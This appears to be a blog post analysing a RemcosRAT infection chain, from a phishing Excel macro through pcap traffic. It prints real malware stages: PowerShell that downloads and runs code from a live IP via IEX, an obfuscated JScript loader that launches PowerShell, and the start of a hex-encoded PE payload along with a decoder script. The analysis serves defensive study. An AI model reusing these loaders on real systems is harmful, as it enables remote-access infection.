</span><span class="code-line"><span class="token keyword">do</span> <span class="token punctuation">{</span><span class="token variable">$ping</span> = <span class="token function">test-connection</span> <span class="token operator">-</span>comp google<span class="token punctuation">.</span>com <span class="token operator">-</span>count 1 <span class="token operator">-</span>Quiet<span class="token punctuation">}</span> <span class="token keyword">until</span> <span class="token punctuation">(</span><span class="token variable">$ping</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line"><span class="token variable">$tty</span>=<span class="token string">&#x27;(New-Object Net.WebClient)&#x27;</span><span class="token punctuation">|</span>I`E`X<span class="token punctuation">;</span>
</span><span class="code-line"><span class="token variable">$mv</span>= <span class="token namespace">[Microsoft.VisualBasic.Interaction]</span>::CallByname<span class="token punctuation">(</span><span class="token variable">$tty</span><span class="token punctuation">,</span><span class="token string">&#x27;DownloadString&#x27;</span><span class="token punctuation">,</span><span class="token namespace">[Microsoft.VisualBasic.CallType]</span>::Method<span class="token punctuation">,</span><span class="token string">&#x27;http://104.223.119.167/calient.jpg&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line"><span class="token variable">$r78fd000sd</span>= <span class="token variable">$mv</span> <span class="token operator">-</span>split <span class="token string">&#x27;%&#x27;</span> <span class="token punctuation">|</span><span class="token function">ForEach-Object</span> <span class="token punctuation">{</span><span class="token namespace">[char]</span><span class="token namespace">[byte]</span><span class="token string">&quot;0x<span class="token variable">$_</span>&quot;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
</span><span class="code-line"><span class="token variable">$y5jh62df0</span>= I`E`X<span class="token punctuation">(</span><span class="token variable">$r78fd000sd</span> <span class="token operator">-join</span> <span class="token string">&#x27;&#x27;</span><span class="token punctuation">)</span>
</span></code></pre></div><p>The deobfuscated powershell script above downloads another string at the domain highlighted above. The malware gets obsfuscated strings of the <code>calient.jpg</code> url.</p><h2 id="stage3-downloader-calientjpg"><a href="#stage3-downloader-calientjpg" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Stage3 Downloader (calient.jpg)</h2><p>Stage two downloads third obfuscated script strings in calient.jpg url. This string is obfuscated and larger than the second stage <code>atcn.jpg</code> string. Looking at the obfuscated strings we have an interesting string referenced by <code>ftIXfysfU</code> variable.</p><div class="relative"><pre><code class="code-highlight language-xml"><span class="code-line">$y=&#x27;[System.AppDomain]&#x27;|W0B4J;
</span><span class="code-line">$g55=$y.GetMethod(&quot;get_CurrentDomain&quot;)
</span><span class="code-line">
</span><span class="code-line"> [String]$ftIXfysfU=&#x27;4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300AF89D1610000000000000000E00002210B010800004402000048
</span></code></pre></div><p>The string above seems to be an executable. This is because of the header file of PE executable. The magic number 4D5A or ASCII characters MZ represents the beginning of the file signature of Microsoft PE file.</p><div><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27630%27%20height=%27259%27/%3e"/></span><img alt="Http filter" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="Http filter" src="/static/images/mal/remcosrat/pehead.png" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></div><p>Simple python script for decoding the bytes into an executable</p><div class="relative"><pre><code class="code-highlight language-python"><span class="code-line"><span class="token comment">#convert bytearray to PE</span>
</span><span class="code-line">remcosPE<span class="token operator">=</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">&#x27;4D5A90000300000004000000FFFc....&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&#x27;open.exe&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;wb&#x27;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> filepe<span class="token punctuation">:</span>
</span><span class="code-line">    filepe<span class="token punctuation">.</span>write<span class="token punctuation">(</span>remcosPE<span class="token punctuation">)</span>
</span></code></pre></div><p>Now we have a fully RemcosRat malware, which a .NET family malware.</p><div class="relative"><pre><code class="code-highlight language-bash"><span class="code-line">remcosrat$ <span class="token function">file</span> open.exe
</span><span class="code-line">open.exe: PE32 executable <span class="token punctuation">(</span>DLL<span class="token punctuation">)</span> <span class="token punctuation">(</span>console<span class="token punctuation">)</span> Intel <span class="token number">80386</span> Mono/.Net assembly, <span class="token keyword">for</span> MS Windows
</span></code></pre></div><p>Next is analyzing the dropped PE file.</p><h2 id="references"><a href="#references" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>References</h2><ol><li><a target="_blank" rel="noopener noreferrer" href="https://www.malware-traffic-analysis.net/2022/01/04/index.html">https://www.malware-traffic-analysis.net/2022/01/04/index.html</a></li><li><a target="_blank" rel="noopener noreferrer" href="https://twitter.com/Unit42_Intel/status/1478744612516900868/">https://twitter.com/Unit42_Intel/status/1478744612516900868/</a></li></ol></div><div id="comment"></div></div><footer><div class="divide-gray-200 text-sm font-medium leading-5 dark:divide-gray-700 xl:col-start-1 xl:row-start-2 xl:divide-y"><div class="py-4 xl:py-8"><h2 class="text-xs uppercase tracking-wide text-gray-500 dark:text-gray-400">Tags</h2><div class="flex flex-wrap"><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/remcos">Remcos</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/rat">rat</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/malware">malware</a></div></div><div class="flex justify-between py-4 xl:block xl:space-y-8 xl:py-8"><div><h2 class="text-xs uppercase tracking-wide text-gray-500 dark:text-gray-400">Previous Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/ropemporium-callme">Return-Oriented Programming - Callme</a></div></div><div><h2 class="text-xs uppercase tracking-wide text-gray-500 dark:text-gray-400">Next Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/redlinerstealer">RedLineStealer Information Stealer Analysis</a></div></div></div></div><div class="sticky top-0 pt-4 xl:pt-8"><a class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/blog">← Back to the Blog</a><div class="hidden md:block"><div class="mt-5 space-y-1 text-sm"><p class="text-lg font-bold">Table of content</p></div></div></div></footer></div></div></article></div></main><footer><div class="mt-16 flex flex-col items-center"><div class="mb-3 flex space-x-4"><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="mailto:thuri783@gmail.com"><span class="sr-only">mail</span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" class="fill-current text-gray-700 hover:text-blue-500 dark:text-gray-200 dark:hover:text-blue-400 h-6 w-6"><path d="M2.003 5.884 10 9.882l7.997-3.998A2 2 0 0 0 16 4H4a2 2 0 0 0-1.997 1.884z"></path><path d="m18 8.118-8 4-8-4V14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8.118z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://github.com/thuri10"><span class="sr-only">github</span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 hover:text-blue-500 dark:text-gray-200 dark:hover:text-blue-400 h-6 w-6"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://twitter.com/0xhexski"><span class="sr-only">twitter</span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="fill-current text-gray-700 hover:text-blue-500 dark:text-gray-200 dark:hover:text-blue-400 h-6 w-6"><path d="M23.953 4.57a10 10 0 0 1-2.825.775 4.958 4.958 0 0 0 2.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 0 0-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 0 0-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 0 1-2.228-.616v.06a4.923 4.923 0 0 0 3.946 4.827 4.996 4.996 0 0 1-2.212.085 4.936 4.936 0 0 0 4.604 3.417 9.867 9.867 0 0 1-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 0 0 7.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0 0 24 4.59z"></path></svg></a></div><div class="mb-2 flex space-x-2 text-sm text-gray-500 dark:text-gray-400"><div>Thuri10</div><div> • </div><div>© 2022</div><div> • </div><a href="/">Solar Bits</a></div><div class="mb-8 text-sm text-gray-500 dark:text-gray-400"><a target="_blank" rel="noopener noreferrer" href="https://github.com/timlrx/tailwind-nextjs-starter-blog">Tailwind Nextjs Theme</a></div></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"mdxSource":"var Component=(()=\u003e{var p=Object.create;var l=Object.defineProperty;var d=Object.getOwnPropertyDescriptor;var h=Object.getOwnPropertyNames;var m=Object.getPrototypeOf,u=Object.prototype.hasOwnProperty;var N=(a,s)=\u003e()=\u003e(s||a((s={exports:{}}).exports,s),s.exports),k=(a,s)=\u003e{for(var t in s)l(a,t,{get:s[t],enumerable:!0})},i=(a,s,t,n)=\u003e{if(s\u0026\u0026typeof s==\"object\"||typeof s==\"function\")for(let c of h(s))!u.call(a,c)\u0026\u0026c!==t\u0026\u0026l(a,c,{get:()=\u003es[c],enumerable:!(n=d(s,c))||n.enumerable});return a};var g=(a,s,t)=\u003e(t=a!=null?p(m(a)):{},i(s||!a||!a.__esModule?l(t,\"default\",{value:a,enumerable:!0}):t,a)),f=a=\u003ei(l({},\"__esModule\",{value:!0}),a);var r=N((F,o)=\u003e{o.exports=_jsx_runtime});var v={};k(v,{default:()=\u003ey,frontmatter:()=\u003ew});var e=g(r()),w={title:\"RemcosRat infection chain from excel with Macros\",date:\"2022-01-25\",tags:[\"Remcos\",\"rat\",\"malware\"],draft:!1,summary:\"RemcosRAT is a Fileless multi-stage malware that is distributed through malicious macros in Excel files.\",images:\"/static/images/mal/remcosrat/headmail.jpg\",layout:\"PostLayout\",canonicalUrl:null};function b(a={}){let{wrapper:s}=a.components||{};return s?(0,e.jsx)(s,Object.assign({},a,{children:(0,e.jsx)(t,{})})):t();function t(){let n=Object.assign({h1:\"h1\",a:\"a\",span:\"span\",p:\"p\",div:\"div\",h2:\"h2\",strong:\"strong\",code:\"code\",pre:\"pre\",ol:\"ol\",li:\"li\"},a.components),{Image:c}=n;return c||x(\"Image\",!0),(0,e.jsxs)(e.Fragment,{children:[(0,e.jsxs)(n.h1,{id:\"what-is-remcosrat\",children:[(0,e.jsx)(n.a,{href:\"#what-is-remcosrat\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"What is RemcosRat?\"]}),(0,e.jsxs)(n.p,{children:[\"RemcosRAT is a Fileless multi-stage malware that is distributed through malicious macros in Excel files. The malware enables remote administration of infected systems to perform unintended actions. This is a simple guide on understanding RemcosRat infection chain. The RemcosRAT infection can be described as shown in the image by \",(0,e.jsx)(n.a,{href:\"https://twitter.com/Unit42_Intel/status/1478744612516900868\",children:\"@Unit 42\"}),\".\"]}),(0,e.jsx)(n.div,{children:(0,e.jsx)(c,{alt:\"Infection Chain\",src:\"/static/images/mal/remcosrat/chain.jpeg\",width:\"2480\",height:\"1287\"})}),(0,e.jsx)(n.p,{children:\"The infection chain start through phishing of the targets through mail services, the final payload of the infection chain is the used for communicating through TCP port 10174 as shown in the image.\"}),(0,e.jsxs)(n.p,{children:[\"The samples and IOC can be downloaded from the following malware-traffic-analysis website \",(0,e.jsx)(n.a,{href:\"https://www.malware-traffic-analysis.net/2022/01/04/index.html\",children:\"RemcosRat sample\"}),\".\"]}),(0,e.jsxs)(n.h2,{id:\"pcap-analysis\",children:[(0,e.jsx)(n.a,{href:\"#pcap-analysis\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Pcap Analysis\"]}),(0,e.jsxs)(n.p,{children:[(0,e.jsx)(n.a,{href:\"https://twitter.com/malware_traffic/status/1478755988023001089\",children:\"Brad\"}),\" has provided infection traffic pcap of the malware samples in his website.\"]}),(0,e.jsx)(n.div,{children:(0,e.jsx)(c,{alt:\"Http filter\",src:\"/static/images/mal/remcosrat/http_filter.png\",width:\"1361\",height:\"229\"})}),(0,e.jsxs)(n.p,{children:[\"Image above shows a Filter of \",(0,e.jsx)(n.strong,{children:\"http\"}),\" traffic in wireshark.The malware is trying to get additional samples using \",(0,e.jsx)(n.strong,{children:\"GET\"}),\" method as highlighted.\"]}),(0,e.jsxs)(n.p,{children:[\"From the tweet provided by \",(0,e.jsx)(n.strong,{children:\"unit42intel\"}),\", the above link of the onedrive downloads a \",(0,e.jsx)(n.code,{children:\"VBS\"}),\" file. The vbs file is not available in the onedrive at the time of writting but it is provided in the malware-traffic-analysis website.\"]}),(0,e.jsx)(n.pre,{className:\"language-html\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-html\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c\"}),\"html\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c\"}),\"head\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c\"}),\"title\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),\"Object moved\",(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c/\"}),\"title\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c/\"}),\"head\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c\"}),\"body\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c\"}),\"h2\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`      Object moved to\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c\"}),\"a\"]}),`\n`]})]}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsxs)(n.span,{className:\"token tag\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"href\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"https://onedrive.live.com/download?cid=64F8294A00286885\",(0,e.jsx)(n.span,{className:\"token entity named-entity\",title:\"\u0026\",children:\"\u0026amp;\"}),\"resid=64F8294A00286885%21770\",(0,e.jsx)(n.span,{className:\"token entity named-entity\",title:\"\u0026\",children:\"\u0026amp;\"}),\"authkey=ABI3zrc6BsVUKxU\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),`\n`]})}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),\"here\",(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c/\"}),\"a\"]}),`\n`]})]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),`.\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c/\"}),\"h2\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c/\"}),\"body\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c/\"}),\"html\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),`\n`]})]})}),(0,e.jsxs)(n.p,{children:[\"Verify the sha256 hash of the \",(0,e.jsx)(n.code,{children:\"misc.vbs\"}),\" matches the one provided in IOcs of Remcos Rat.\"]}),(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-bash\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"@remcosrat$ shasum -a \",(0,e.jsx)(n.span,{className:\"token number\",children:\"256\"}),` misc.vbs\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`95c0a9e6463a2eb1bbfe3198cd4b6cd74927a209ca4ab17501c2f444494f4499  misc.vbs\n`})]})}),(0,e.jsxs)(n.h2,{id:\"stage2-downloader-atcnjpg\",children:[(0,e.jsx)(n.a,{href:\"#stage2-downloader-atcnjpg\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stage2 Downloader (atcn.jpg)\"]}),(0,e.jsxs)(n.p,{children:[\"Right click the \",(0,e.jsx)(n.code,{children:\"GET /atcn.jpg\"}),\" url in wireshark and follow the \",(0,e.jsx)(n.strong,{children:\"http\"}),\" stream. The HTTP streams of the urls accessed by the malware are as shown below.\"]}),(0,e.jsx)(n.div,{children:(0,e.jsx)(c,{alt:\"url wireshark\",src:\"/static/images/mal/remcosrat/stage1_stream.png\",width:\"882\",height:\"587\"})}),(0,e.jsxs)(n.p,{children:[\"From the above, the malware is executing a powershell script. The script seems to be obsfuscated. For further analysis we can export all the http objects. For exporting http objects, Click the \",(0,e.jsx)(n.code,{children:\"File -\u003e Export Objects -\u003e HTTP\"}),\" in wireshark. select saveall to download all the http objects in malware connection traffic.\"]}),(0,e.jsx)(n.div,{children:(0,e.jsx)(c,{alt:\"Export Http objects \",src:\"/static/images/mal/remcosrat/exported_http.png\",width:\"742\",height:\"196\"})}),(0,e.jsx)(n.p,{children:\"First check the file format of the files, The downloaded files as are not images as the extensions suuggests to. They are ASCCII text files.\"}),(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-bash\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"file\"}),` atcn.jpg\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"atcn.jpg: ASCII text, with very long lines \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"4130\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`, with CRLF line terminators\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"file\"}),` calient.jpg\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"calient.jpg: ASCII text, with very long lines \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"65536\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`, with no line terminators\n`]})]})}),(0,e.jsx)(n.p,{children:\"Below is the obfuscated powershell script.\"}),(0,e.jsx)(n.pre,{className:\"language-javascript\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-javascript\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"xsl\",(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\"stylesheet version\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"1.0\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"xmlns\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\"xsl\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"http://www.w3.org/1999/XSL/Transform\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"xmlns\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\"msxsl\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"urn:schemas-microsoft-com:xslt\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"xmlns\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\"user\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"http://mycompany.com/mynamespace\"'}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"msxsl\",(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\"script language\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"JScript\"'}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"implements\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\"prefix\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"user\"'}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"!\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token constant\",children:\"CDATA\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"var\"}),\" r \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"new\"}),\" \",(0,e.jsx)(n.span,{className:\"token class-name\",children:\"ActiveXObject\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token function\",children:\"x0asd44\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"5368656c6c2e4170706c69636174696f6e\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"var\"}),\" yy\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"r\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token function property-access method\",children:(0,e.jsx)(n.span,{className:\"token maybe-class-name\",children:\"ShellExecute\"})}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"powershell.exe\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),(0,e.jsx)(n.span,{className:\"token function\",children:\"x0asd44\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"202444436F626356456D76694A72416B484D595547573D2732372535422537362536462536392536342532372532302532422532302532372535442532302535422535332537392537332537342532372532302532422532302532372536352536442532452535322536352536362536432536352532372532302532422532302532372536332537342536392536462536452532452534312537332537332536352532372532302532422532302532372536442536322536432537392535442533412533412534432536462536312536342535372536392532372532302532422532302532372537342536382535302536312537322537342536392536312536432534452536312536442536352532382532372532372534442536392536332537322536462537332536462536362537342532452535362536392537332537352536312536432534322536312537332536392536332532372532372532392532372537432534392534352535382533422532342537342533352533362536362536372532302533442532302535422534352536452537352536442535442533412533412535342536462534462536322536412536352536332537342532382535422535332537392537332537342536352536442532452534452536352537342532452535332536352536332537352537322536392537342537392535302537322536462537342536462536332536462536432535342537392537302536352535442532432532302533332533302533372533322532392533422535422535332537392537332537342536352536442532452534452536352537342532452535332536352537322537362536392536332536352535302536462536392536452537342534442536312536452536312536372536352537322535442533412533412535332536352536332537352537322536392537342537392535302537322536462537342536462536332536462536432532302533442532302532342537342533352533362536